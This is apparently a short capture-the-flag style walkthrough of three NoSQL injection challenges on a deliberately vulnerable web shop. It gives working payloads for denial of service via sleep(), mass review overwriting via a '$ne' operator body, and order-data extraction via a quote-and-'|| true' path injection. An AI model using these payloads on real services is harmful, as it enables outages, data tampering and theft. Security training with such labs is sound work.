## Table of contents

1. [NoSQL DoS](#1-nosql-dos)
2. [NoSQL Manipulation](#2-nosql-manipulation)
3. [NoSQL Exfiltration](#3-nosql-exfiltration)

## 1. NoSQL DoS

> The vulnerable request's request line is `GET /rest/products/1/reviews HTTP/1.1`. Change the request line to match like `GET /rest/products/sleep(1000)/reviews HTTP/1.1`.

- Since I was running this app on a kubernates pod with HA, I saw that it created new pods when the one I was using got "paused".

## 2. NoSQL Manipulation

> The vulnerable endpoint's path is `/rest/products/reviews` and request method is `PATCH`.

1. Change the request's body to `{"id":{"$ne": null},"message":"anything goes around here"}`. This will change all reviews to the value we provided in the message parameter.

## 3. NoSQL Exfiltration

> The vulnerable endpoint is `/rest/track-order/[id]`.

1. Append **`'`** this to the id and inspect the response to confirm that this request is vulnerable to NoSQLi.
2. Send a request with `/juice.local/rest/track-order/5267-c2ec33e92928725c' || true || '` in the request path.